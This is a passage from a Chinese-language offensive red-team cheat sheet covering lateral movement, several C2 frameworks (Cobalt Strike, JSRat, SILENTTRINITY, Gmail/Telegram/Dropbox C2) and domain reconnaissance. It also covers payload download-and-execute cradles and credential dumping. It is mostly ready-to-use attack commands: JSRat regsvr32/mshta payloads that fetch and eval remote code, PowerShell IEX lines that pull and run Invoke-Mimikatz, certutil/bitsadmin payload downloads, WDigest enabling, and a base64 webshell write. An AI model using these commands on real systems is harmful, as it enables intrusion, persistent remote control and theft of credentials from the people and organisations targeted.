Pivoting ->Listener新建一条已有权限机器的监听器
```

![image](http://159.75.51.84:8000/img/233.png) ![image](http://159.75.51.84:8000/img/234.png) ![image](http://159.75.51.84:8000/img/235.png)

```
选择 Attacks->Packages->Windows Executable(Stageless)
```

![image](http://159.75.51.84:8000/img/236.png)

```
上传生成的payload到已上线的目标机中，上传PsExec.exe
beacon>shell C:\psexec.exe -accepteula \\10.1.1.105 -u administrator -p xxx -d -c C:\beacon.exe
```

![image](http://159.75.51.84:8000/img/237.png)

##### SMB_BEACON  smb_beacon)

```
新建监听器(bind)windows/beacon_smb/bind_pipe
执行
>psexec 机器名 ADMIN$/c$ bind
```

##### SSH LOGIN  ssh-login)

```
>ssh 10.1.1.98:22 root admin
```

![image](http://159.75.51.84:8000/img/238.png)

#### 代理  _63)

```
>socks 690
视图->代理信息-tunnel 直接复制，粘贴到MSF中
```

#### 部署VPN  vpn)

![image](http://159.75.51.84:8000/img/239.png)

```
选择内网网卡
```

![image](http://159.75.51.84:8000/img/240.png) ![image](http://159.75.51.84:8000/img/241.png) ![image](http://159.75.51.84:8000/img/242.png)

```
添加
```

![image](http://159.75.51.84:8000/img/243.png) ![image](http://159.75.51.84:8000/img/244.png) ![image](http://159.75.51.84:8000/img/245.png)

```
删除
```

![image](http://159.75.51.84:8000/img/246.png)

#### Cobalt strike派生 Empire和MSF  cobalt-strike-empiremsf)

##### 派生EMPIRE  empire_2)

```
创建一个Listener
创建一个stager
>usestager windows/shellcode 执行，会生成/tmp/launcher.bin
CS 使用PS命令查找进程，进行进程注入(>shinject 进程id x64)，选择launcher.bin即可
```

##### 派生MSF  msf_7)

```
使用CS的外部监听器
windows/foreign/reverse_dns_txt
windows/foreign/reverse_http
windows/foreign/reverse_https
windows/foreign/reverse_tcp
msf开启监听
cobalt strike会话主机上点击spwan，创建外部监听器，选择windows/foreign/reverse_tcp指定MSF监听的IP和端口即可
```

### JSRat  jsrat_1)

```
https://github.com/Hood3dRob1n/JSRat-Py
https://github.com/Ridter/MyJSRat
启动
>python JSRat.py -i 192.168.0.107 -p 1234
MyJSRat可以-c参数指定执行的命令
```

![image](http://159.75.51.84:8000/img/247.png)

```
/connect是回连地址，/wtf是执行代码
```

![image](http://159.75.51.84:8000/img/248.png)

```
直接在靶机执行
```

![image](http://159.75.51.84:8000/img/249.png)

```
或
>regsvr32.exe /u /n /s /i:http://192.168.0.107:1234/file.sct scrobj.dll
JSRat显示上线
```

![image](http://159.75.51.84:8000/img/250.png) ![image](http://159.75.51.84:8000/img/251.png)

```
Wsc方式
<?xml version="1.0"?>
<package>
<component id="testCalc">
<script language="JScript">
<![CDATA[
        rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try{v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);}catch(e){}h.Open(\"GET\",\"http://192.168.0.107:1234/connect\",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}";
        new ActiveXObject("WScript.Shell").Run(rat,0,true);
]]>
</script>
</component>
</package>
>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://192.168.0.107/jsrat.wsc")
Mshta方式
>mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.0.107:1234/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}
```

### CrackMapExec  crackmapexec)

#### 信息收集  _64)

```
返回活动主机
>crackmapexec smb 192.168.0.0/24
```

![image](http://159.75.51.84:8000/img/252.png)

#### 爆破  _65)

```
支持协议ssh,smb,winrm,mssql,http
爆破smb协议，两台机器，一个用户名多个密码
>crackmapexec smb 192.168.0.98 192.168.0.55 -u username1 -p password1 password2
>crackmapexec smb 192.168.0.0/24 -d zone.com -u y -p 'password' --shares
```

![image](http://159.75.51.84:8000/img/253.png)

```
密码喷射
>crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
指定字典
>crackmapexec <protocol> <target(s)> -u /tmp/user.txt -p /tmp/pass.txt
Hash爆破
>crackmapexec <protocol> <target(s)> -u /tmp/user.txt -H /tmp/ntlm.txt
```

#### 可用模块  _66)

```
日志的保存位置
~/.cme/logs
查看协议可用后续模块
>crackmapexec smb -L
```

![image](http://159.75.51.84:8000/img/254.png)

```
常用的模块
Get-ComputerDetails获取计算机信息
Bloodhound 执行一个BloodHound脚本获取信息
empire_exec 与empire交互
enum_avproducts 列举AV产品
enum_chrome 获取目标chrome中保存的密码
get_keystrokes 键盘记录
get_netdomaincontroller 列出所有域控制器
get_netrdpsession 列出活动的RDP会话
gpp_autologin 从域控中registry.xml查找自动登录的账户密码
gpp_password 组策略凭据中返回GPP密码
invoke_sessiongopher 保存putty,winscp,filezilla,superputty rdp的session
invoke_vnc 注入一个vnc客户端到内存
met_inject 与msf交互
mimikatz 调用mimikatz模块
mimikatz_enum_chrome 使用mimikatz解密chrome保存的密码
mimikatz_enum_vault_creds 解密windows凭据管理器中保存的密码
mimikittenz 执行咪咪猫(windows密码获取软件)
multirdp 允许多用户登录RDP
netripper 通过API hooking截取平常
pe_inject DLL/EXE注入
rdp 开启或关闭RDP
shellcode_inject 注入shellcode
tokens 列举可用token
uac 查看UAC是否开启
wdigest 开启或关闭wdigest
web_delivery 执行exploit/multi/script/web_delivery模块
查看模块的选项
>crackmapexec smb -M module --options
```

![image](http://159.75.51.84:8000/img/255.png)

```
使用方式
>crackmapexec smb <target(s)> -u user -p 'P@ssw0rd' -M module -o 参数=值
```

![image](http://159.75.51.84:8000/img/256.png)

#### PTH  pth)

```
>crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
>crackmapexec smb <target(s)> -u username -H NTHASH
```

#### 执行命令  _67)

```
>crackmapexec smb 192.168.0.98 -u y -p 'qwe12323' -x 'command'
```

![image](http://159.75.51.84:8000/img/257.png)

```
-X执行powershell命令
>crackmapexec smb 192.168.0.98 -u y -p 'qwe12323' -X 'POWESHELL'
```

### koadic  koadic)

```
https://github.com/zerosum0x0/koadic
>git clone https://github.com/zerosum0x0/koadic.git
>cd koadic
>pip3 install -r requirements.txt
>./koadic
```

### SILENTTRINITY  silenttrinity)

```
https://github.com/byt3bl33d3r/SILENTTRINITY
类似cobalt strike+empire的结合
>git clone https://github.com/byt3bl33d3r/SILENTTRINITY
>pip3 install --user pipenv && pipenv install && pipenv shell
>python st.py
服务端执行
>python3 st.py teamserver <teamserver_ip> <teamserver_password>
>python3 st.py teamserver 192.168.0.108 123456
也可加参数--port指定端口
```

![image](http://159.75.51.84:8000/img/258.png)

```
客户端执行
>python3 st.py client wss://<username>:<teamserver_password>@<teamserver_ip>:5000
>python3 st.py client wss://y:123456@192.168.0.108:5000
```

![image](http://159.75.51.84:8000/img/259.png)

```
>listeners命令进入监听器目录
>use http选择监听器
>options命令查看需要配置的参数
```

![image](http://159.75.51.84:8000/img/260.png)

```
>set Port 8081 使用set命令配置参数
>start 启动监听器
>list查看运行中的监听器
```

![image](http://159.75.51.84:8000/img/261.png)

```
>stop http使用stop+监听器名字停止监听器
>stagers进入payload目录
>list列出可用payload
```

![image](http://159.75.51.84:8000/img/262.png)

```
>use payloadname 命令use+payload名字
>generate http generate+监听器名字生成payload
```

![image](http://159.75.51.84:8000/img/263.png)

### Browser C2  browser-c2)

```
360全套+火绒没有拦截
缺点:会有黑框，并且打开chrome浏览器，功能限制
https://github.com/0x09AL/Browser-C2
>go get -u github.com/gorilla/mux
>go get -u github.com/chzyer/readline
>git clone https://github.com/0x09AL/Browser-C2.git
/Browser-C2/agent/agent.go修改C2地址
```

![image](http://159.75.51.84:8000/img/264.png)

```
修改chrome的位置
```

![image](http://159.75.51.84:8000/img/265.png)

```
编译客户端
>CGO_ENABLED=1 GOARCH= GOOS=windows go build
```

![image](http://159.75.51.84:8000/img/266.png)

```
 /Browser-C2/static/jquery.js修改控制服务器IP
```

![image](http://159.75.51.84:8000/img/267.png)

```
转到主目录编译服务器端
>go build
靶机执行生成好的客户端
攻击机监听
```

![image](http://159.75.51.84:8000/img/268.png)

```
此框架与靶机之间通信未加密，功能有限，可与msf、cs、poshc2、empire等框架建立联系。
```

### DropBox C2  dropbox-c2)

```
>git clone https://github.com/Arno0x/DBC2 dbc2
>cd dbc2
>pip install -r requirements.txt
>chmod +x dropboxC2.py
https://www.dropbox.com/developers/apps/create
创建好后要生成个accesstoken，填入config.py中
```

![image](http://159.75.51.84:8000/img/269.png)

```
执行
```

![image](http://159.75.51.84:8000/img/270.png)

```
这里需设置一个与受控机交互的加密密码
发布agent
>publishStage dbc2_agent.exe
使用命令listPublishedStage可以看到已发布的agent
```

![image](http://159.75.51.84:8000/img/271.png)

```
生成payload
>genStager [tab]查看可生成的格式
```

![image](http://159.75.51.84:8000/img/272.png)

```
>genStager oneliner default生成powershell格式payload
```

![image](http://159.75.51.84:8000/img/273.png)

```
>genStager batch default生成bat格式
```

![image](http://159.75.51.84:8000/img/274.png)

```
Msbuild，其余不做演示
```

![image](http://159.75.51.84:8000/img/275.png)

```
这里使用powershell格式的，在受控机运行
```

![image](http://159.75.51.84:8000/img/276.png)

```
攻击机可以看到上线
```

![image](http://159.75.51.84:8000/img/277.png)

```
>list命令可以看到已控机器
```

![image](http://159.75.51.84:8000/img/278.png)

```
使用use命令与受控机器交互
```

![image](http://159.75.51.84:8000/img/279.png)

```
输入?获得后续命令
```

![image](http://159.75.51.84:8000/img/280.png)

### Gmail C2  gmail-c2)

#### Gcat  gcat)

```
https://myaccount.google.com/lesssecureapps
启用设置
```

![image](http://159.75.51.84:8000/img/281.png)

```
Gmail启用imap
```

![image](http://159.75.51.84:8000/img/282.png)

```
将以下脚本转换为exe
# setup.py
from distutils.core import setup
import py2exe

setup(console=['implant.py'])
https://github.com/byt3bl33d3r/gcat
把gcat项目中的implant.py跟以上脚本放在同一目录，修改implant.py中的账户信息
```

![image](http://159.75.51.84:8000/img/283.png)

```
>python 1.py py2exe打包
dist目录下生成implant.exe受控机执行
同时也要修改项目中gcat.py中的账户信息
```

![image](http://159.75.51.84:8000/img/284.png)

```
在受控机执行implant.exe，如果报错修改email模块以下三行
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
```

![image](http://159.75.51.84:8000/img/285.png)

```
执行后，邮箱会收到信息
```

![image](http://159.75.51.84:8000/img/286.png)

```
使用gcat.py也可以得到当前会话
>python gcat.py -list
```

![image](http://159.75.51.84:8000/img/287.png)

```
现在可对其进行控制
>python gcat.py -id [id] -cmd 'net user'
```

![image](http://159.75.51.84:8000/img/288.png)

```
生成jobid，指定jobid可查看回显
```

![image](http://159.75.51.84:8000/img/289.png)

```
邮箱中也存在
```

![image](http://159.75.51.84:8000/img/290.png)

```
当受控机为中文系统时，回显会报错，修改代码
```

![image](http://159.75.51.84:8000/img/291.png)

```
其他模块有回显的直接修改后重新py2exe打包即可。
支持的功能:cmd,upload/download,执行shellcode,键盘记录,截屏等
```

#### Gdog  gdog)

```
https://github.com/maldevel/gdog
功能更多:
加密传输、地理位置、执行命令、上传下载、shellcode、截图、键盘记录、关闭重启、注销用户、从web下载、访问网站等
配置流程基本一样，需要打包exe，但是要安装一些模块PyCrypto、WMI、Enum34、Netifaces
# setup.py
from distutils.core import setup
import py2exe

setup(console=['client.py'])
client.py在回显处也要添加decode gbk
执行client.exe报超出索引错误时
在client.py中搜索字符串for iface in netifaces.interfaces():
在它下面一行修改为
if netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr'] == self.MAC and netifaces.AF_INET in netifaces.ifaddresses(iface):
打包好后执行
```

![image](http://159.75.51.84:8000/img/292.png) ![image](http://159.75.51.84:8000/img/293.png) ![image](http://159.75.51.84:8000/img/294.png) ![image](http://159.75.51.84:8000/img/295.png)

```
提取jobid回显出错的话，添加
reload(sys)
sys.setdefaultencoding("utf-8")
执行shellcode
>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform Windows EXITFUNC=thread LPORT=4444 LHOST=x.x.x.x -f python
去除引号加减号，只保留shellcode粘贴到文件shell.txt
>python gdog.py -id {id} -exec-shellcode /tmp/shell.txt
```

### Telegram C2  telegram-c2)

```
登录telegram
访问https://telegram.me/botfather，发送消息
```

![image](http://159.75.51.84:8000/img/296.png)

```
创建一个bot
```

![image](http://159.75.51.84:8000/img/297.png)

```
创建完成后返回一个token
>pip install telepot
>pip install requests
>git clone https://github.com/blazeinfosec/bt2.git
编辑bt2.py
粘贴token和chatid进脚本
Chat_id的获取方式
https://api.telegram.org/bot<token>/getUpdates
```

![image](http://159.75.51.84:8000/img/298.png) ![image](http://159.75.51.84:8000/img/299.png)

```
当有受控机上线时会列出功能
```

![image](http://159.75.51.84:8000/img/300.png) ![image](http://159.75.51.84:8000/img/301.png)

```
Windows
https://github.com/sf197/Telegra_Csharp_C2
```

## 信息收集  _68)

### Cmd  cmd)

```
>whoami /user 查看当前用户SID
>net config Workstation 查看当前计算机信息
>net time /domain 判断主域
错误5：存在域，当前不是域用户
显示时间：存在域，当前是域内用户
找不到域：不存在
>net view /domain 列出域列表
>net group "Domain Controllers" /domain查看主域控
>nltest /DCLIST:zone.com 查看域控
>net group "domain admins" /domain 查看域管理员
>net group "enterprise admins" /domain 查看企业管理员列表
>net localgroup administrators /domain 查看管理组用户
>net group "domain computers" /domain 查看域成员计算机
>net accounts /domain 查看密码策略
>net user /domain查看域内用户
>net view /domain:dc 查询域内计算机
>netsh firewall set opmode disable/enable 关闭windows防火墙(win2003)
>netsh advfirewall set allprofiles state off/on(大于win2003)
>arp -a查看arp表
>net start 查看服务
>route print查看路由表
>query user查看登录机器的用户的连接状态
>tasklist /v 查看域管理员进程
>dsquery server查询域控制器
>dsquery computer 查询域内机器
>dsquery user 查询域用户
>dsquery ou 域内组织单位
导出域DNS记录，文件保存在C:\Windows\System32\dns\
>dnscmd /zoneexport zone.com 1.txt
导出LDAP数据库
>LDIFDE -f c:\windows\temp\dump.ldf -n -m
```

### Wmi  wmi_1)

```
>wmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本
>wmic service list brief 列出本机服务
>wmic process list brief 列出进程
>wmic process where name="chrome.exe" get executablepath进程路径
>wmic process get caption,commandline /value>>1.txt查询所有进程参数
>wmic process where caption="svchost.exe" get caption,commandline /value 查询某个进程命令行参数
创建进程
>wmic process call create calc
>wmic process call create "C:\shell.exe"
>wmic process call create "shutdown.exe -r -f -t 20"
结束进程
>wmic process where name="shell.exe" call terminate
>wmic process where processid="2345" delete
>wmic process 2345 call terminate
>wmic startup list brief 列出自启动程序
>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件
>wmic netuse list brief 列出共享驱动盘
>wmic ntdomain list brief 查询域控制器
>wmic useraccount list brief 列出本机管理员及SID
>wmic qfe list brief 列出补丁列表
>wmic share get name,path 查看共享
>wmic startup list brief查看启动项
>wmic product get name,version 查看安装的软件
>wmic product where "name like '%360%'" get name 查看程序名
>wmic product where name="360tray" call uninstall 卸载程序
>wmic process where "name like '%360%'" get name 查找进程全名
>wmic product where name="360tray.exe" call terminate 停止程序
>wmic desktop get screensaversecure,screensavertimeout 查看屏保
```

### PowerView  powerview)

```
获取域信息
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Get-NetDomain}"
```

![image](http://159.75.51.84:8000/img/302.png)

```
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; get-netforest}"
```

![image](http://159.75.51.84:8000/img/303.png)

```
枚举管理员
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-EnumerateLocalAdmin}"
```

![image](http://159.75.51.84:8000/img/304.png)

```
查询管理在线的机器
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; invoke-userhunter}"
```

![image](http://159.75.51.84:8000/img/305.png)

```
查看域内机器以administrator权限运行的进程
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; invoke-processhunter }"
```

![image](http://159.75.51.84:8000/img/306.png)

```
或指定参数userfile和computerfile查询某台机器某个用户的进程
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; invoke-processhunter -Userfile .\user.txt -computerfile .\host.txt}"
```

![image](http://159.75.51.84:8000/img/307.png)

```
查询域内机器共享
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-sharefinder}"
```

![image](http://159.75.51.84:8000/img/308.png)

```
查询域内机器
>Get-NetComputer -Domain zone.com
```

![image](http://159.75.51.84:8000/img/309.png)

```
>Find-LocalAdminAccess -verbose 查询域内本地用户能登录的机器
```

![image](http://159.75.51.84:8000/img/310.png)

```
Dev-powerview
获取域控机器和win版本
>Get-DomainController |select name,osversion|fl
```

### Linux  linux_4)

```
操作系统&内核版本&环境变量
>cat /etc/issue
>cat /etc/*-release
>cat /etc/lsb-release
>cat /etc/redhat-release
cat /proc/version
>uname -a
>uname -mrs
>rpm -q kernel
>dmesg | grep Linux
>ls /boot | grep vmlinuz-
>cat /etc/profile
>cat /etc/bashrc
>cat ~/.bash_profile
>cat ~/.bashrc
>cat ~/.bash_logout
>env
>set
Root权限进程
>ps aux | grep root
>ps -ef | grep root
计划任务
>crontab -l
>ls -alh /var/spool/cron
>ls -al /etc/ | grep cron
>ls -al /etc/cron*
>cat /etc/cron*
>cat /etc/at.allow
>cat /etc/at.deny
>cat /etc/cron.allow
>cat /etc/cron.deny
>cat /etc/crontab
>cat /etc/anacrontab
>cat /var/spool/cron/crontabs/root
IP信息
>/sbin/ifconfig -a
>cat /etc/network/interfaces
>cat /etc/sysconfig/network
连接信息
>grep 80 /etc/services
>netstat -antup
>netstat -antpx
>netstat -tulpn
>chkconfig --list
>chkconfig --list | grep 3:on
>last
>w
用户信息
>id
>whomi
>w
>last
>cat /etc/passwd
>cat /etc/group
>cat /etc/shadow
>ls -alh /var/mail/
>grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # 列出超级用户
>awk -F: '($3 == "0") {print}' /etc/passwd   #列出超级用户
>cat /etc/sudoers
>sudo –l
操作记录
>cat ~/.bash_history
>cat ~/.nano_history
>cat ~/.atftp_history
>cat ~/.mysql_history
>cat ~/.php_history
可写目录
>find / -writable -type d 2>/dev/null      # 可写目录
>find / -perm -222 -type d 2>/dev/null     # 可写目录 
>find / -perm -o w -type d 2>/dev/null     # 可写目录
>find / -perm -o x -type d 2>/dev/null     # 可执行目录
>find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # 可写可执行目录
```

## HTTP服务  http_1)

```
>python2 -m SimpleHTTPServer 
>python3 -m http.server 8080
>php -S 0.0.0.0:8888
>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
>openssl s_server -key key.pem -cert cert.pem -accept 443 –WWW
>ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888,:DocumentRoot => Dir.pwd).start"
>ruby -run -e httpd . -p 8888
```

## 文件操作  _69)

### Windows查找文件  windows_2)

```
>cd /d E: && dir /b /s index.php
>for /r E:\ %i in (index*.php) do @echo %i
>powershell Get-ChildItem d:\ -Include index.php -recurse
```

### Linux查找文件  linux_5)

```
#find / -name index.php
查找木马文件
>find . -name '*.php' | xargs grep -n 'eval('
>find . -name '*.php' | xargs grep -n 'assert('
>find . -name '*.php' | xargs grep -n 'system('
```

### 创建  _70)

```
读文本文件：
>file = Get-Content "1.txt"
>file
>powershell Set-content "1.txt" "wocao"
&
>powershell "write-output ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"d2Vic2hlbGw=\"))) | out-file -filepath c:\www\wwwroot\1.aspx;"
```

### 压缩  _71)

```
>rar.exe a –k –r –s –m3 C:\1.rar C:\wwwroot
>7z.exe a –r –p12345 C:\1.7z C:\wwwroot
```

### 解压  _72)

```
>rar.exe e c:\wwwroot\1.rar
>7z.exe x –p12345 C:\1.7z –oC:\wwwroot
```

### 传输  _73)

#### FTP  ftp)

```
>open 192.168.0.98 21
>输入账号密码
>dir查看文件
>get file.txt
```

![image](http://159.75.51.84:8000/img/311.png)

#### VBS  vbs)

```
#1.vbs
Set Post = CreateObject("Msxml2.XMLHTTP")
Set Shell = CreateObject("Wscript.Shell")
Post.Open "GET","http://192.168.1.192/Client.exe",0
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
aGet.Write(Post.responseBody)
aGet.SaveToFile "C:\1.exe",2 
>cscript 1.vbs
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim http,ado
Set http = CreateObject("Msxml2.serverXMLHTTP")
http.SetOption 2,13056//忽略HTTPS错误
http.open "GET","http://192.168.1.192/Client.exe",False
http.send
Set ado = createobject("Adodb.Stream")
ado.Type = adTypeBinary
ado.Open
ado.Write http.responseBody
ado.SaveToFile "c:\1.exe"
ado.Close
```

#### JS  js)

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1; BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile("1.exe");
>cscript /nologo 1.js http://192.168.1.192/Client.exe
```

![image](http://159.75.51.84:8000/img/312.png)

#### Bitsadmin  bitsadmin)

```
>bitsadmin /transfer n http://192.168.1.192/Client.exe  e:\1.exe
>bitsadmin /rawreturn /transfer getfile http://192.168.1.192/Client.exe e:\1.exe
>bitsadmin /rawreturn /transfer getpayload http://192.168.1.192/Client.exe e:\1.exe
>bitsadmin /transfer myDownLoadJob /download /priority normal "http://192.168.1.192/Client.exe" "e:\1.exe "
```

#### Powershell  powershell_2)

##### 1  1_1)

```
注意：内核5.2以下版本可能无效
>powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/Client.exe','C:\1.exe'); start-process 'c:\1.exe'
>powershell 
>(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.108/1.exe',"$env:APPDATA\csrsv.exe");Start-Process("$env:APPDATA\csrsv.exe")
```

##### 2  2_1)

```
PS>Copy-Item '\\sub2k8.zone.com\c$\windows\1.txt' -Destination '\\dc.zone.com\c$\1.txt'
```

##### 3  3)

```
>powershell ($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.108/ok.txt',$dpl);
```

##### 4  4)

```
高版本
PS>iwr -Uri http://192.168.0.106:1222/111.txt -OutFile 123.txt –UseBasicParsing
```

##### 5  5)

```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Templates
>Import-Module BitsTransfer
>$path = [environment]::getfolderpath("temp")
>Start-BitsTransfer -Source "http://192.168.0.108/ok.txt" -Destination "$path\ok.txt"
>Invoke-Item  "$path\ok.txt"
```

#### Certutil  certutil)

```
>certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe 
>certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete
对文件进行编码下载后解码执行
>base64 payload.exe > /var/www/html/1.txt # 在C&C上生成经base64编码的exe
>certutril -urlcache -split -f http://192.168.0.107/1.txt & certurl -decode 1.txt ms.exe & ms.exe
```

#### Python  python_1)

```
#python -c 'import urllib;urllib.urlretrieve("http://192.168.1.192/Client.exe","/path/to/save/1.exe")'
```

#### Perl  perl_1)

| `1 2 3` | `#!/usr/bin/perl  use LWP::Simple;  getstore("http://192.168.1.192/Client.exe", "1.exe"); ` |
| ------- | ------------------------------------------------------------ |
|         |                                                              |

#### PHP  php_1)

| `1 2 3 4 5 6 7` | `#!/usr/bin/php  <?php $data = @file("http://192.168.1.192/Client.exe"); $lf = "1.exe";          $fh = fopen($lf, 'w');          fwrite($fh, $data[0]);          fclose($fh);  ?> ` |
| --------------- | ------------------------------------------------------------ |
|                 |                                                              |

#### Curl  curl)

```
#curl -o 1.exe http://192.168.1.192/Client.exe
```

#### wget  wget)

```
#wget http://192.168.1.192/Client.exe
#wget –b后台下载
#wget –c 中断恢复
```

#### nc  nc_1)

```
>nc –lvnp 333 >1.txt
目标机
>nc –vn 192.168.1.2 333 <test.txt –q 1
&
>cat 1.txt >/dev/tcp/1.1.1.1/333
```

#### SCP  scp)

```
Linux中传输文件
>scp -P 22 file.txt user@1.1.1.1:/tmp
```

## Hash&密码  hash_1)

### 破解网址  _74)

```
https://www.objectif-securite.ch/en/ophcrack
http://cracker.offensive-security.com/index.php
```

### GoogleColab破解hash  googlecolabhash)

```
之前在freebuf上看到过相关文章，最近在github上也看到了这个脚本，所以拿起来试试，速度可观
https://www.freebuf.com/geek/195453.html
https://gist.github.com/chvancooten/59acfbf1d8ee7a865108fca2e9d04c4a
打开
https://drive.google.com/drive
新建一个文件夹，右键，更多选择google Colab
```

![image](http://159.75.51.84:8000/img/667.png)

```
如果没有，点关联更多应用，搜索这个名字，安装一下即可
```

![image](http://159.75.51.84:8000/img/668.png) ![image](http://159.75.51.84:8000/img/669.png)

```
安装hashcat，下载字典
```

![image](http://159.75.51.84:8000/img/670.png)

```
运行类型选择GPU加速
```

![image](http://159.75.51.84:8000/img/671.png) ![image](http://159.75.51.84:8000/img/672.png)

```
这里测试个简单密码
```

![image](http://159.75.51.84:8000/img/673.png) ![image](http://159.75.51.84:8000/img/674.png) ![image](http://159.75.51.84:8000/img/675.png) ![image](http://159.75.51.84:8000/img/676.png)

```
12亿条密码大概20多分钟
https://download.weakpass.com/wordlists/1851/hashesorg2019.gz
以上是字典
```

![image](http://159.75.51.84:8000/img/677.png)

### 密码策略  _75)

```
默认情况，主机账号的口令每30天变更一次
>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Netlogon\Parameters，键值为DisablePasswordChange，设置为1，即表示禁止修改账号口令
>组策略(gpedit.msc)中修改默认的30天，修改位置为"Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Domain member: Maximum machine account password age"设置为0时，表示无限长
>禁止修改主机账号口令，用来支持VDI (virtual desktops)等类型的使用，具体位置为"Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Domain member: Disable machine account password changes"
Debug Privilege
本地安全策略>本地策略>用户权限分配>调试程序
```

### 开启Wdigest  wdigest)

#### Cmd  cmd_1)

```
>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

#### powershell  powershell_3)

```
>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
```

#### meterpreter  meterpreter_1)

```
>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1
```

### Getpass  getpass)

```
>getpassword.exe>1.txt
```

### QuarksPwDump  quarkspwdump)

```
>QuarksPwDump.exe -dump-hash-local
```

### MSF  msf_8)

```
Meterpreter > run hashdump 
&
Meterpreter > mimikatz_command -f samdump::hashes
&
Meterpreter > load mimikatz
Meterpreter > wdigest
&
Meterpreter > load mimikatz
Meterpreter > msv
Meterpreter > kerberos
&
Meterpreter > load kiwi
Meterpreter > creds_all
&
Meterpreter > migrate PID
Meterpreter > load mimikatz
Meterpreter > mimikatz_command -f sekurlsa::searchPasswords
&
Meterpreter > run windows/gather/smart_hashdump
```

### Empire  empire_3)

```
>usemodule credentials/mimikatz/dcsync_hashdump
```

### Invoke-Dcsync  invoke-dcsync)

```
>powershell -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-DCSync.ps1');invoke-dcsync
```

![image](http://159.75.51.84:8000/img/313.png)

### Mimikatz  mimikatz)

#### 调用mimikatz远程抓取  mimikatz_1)

```
抓明文
>powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.108/nishang/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
抓hash
>powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.100/nishang/Gather/Get-PassHashes.ps1');Get-PassHashes
>powershell -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz" >C:\Users\Administrator.DC\Desktop\1123.txt
```

#### 横向批量抓hash  hash_2)

##### SCHTASKS  schtasks)

```
把IP列表放入ip.txt文件中，通过一个账户密码批量net use与列表里的IP建立连接，如果建立连接没出错的话，复制getpass到目录temp目录，使用账户密码远程创建计划任务名字为windowsupdate，指定每日00：00以system权限执行getpass文件，创建完计划任务后，/tn是立刻执行此计划任务，执行完后删除此计划任务，ping -n 10>nul是程序停留，相当于延时10秒，之后复制文件到本地，接着删除getpass文件，删除创建的连接。
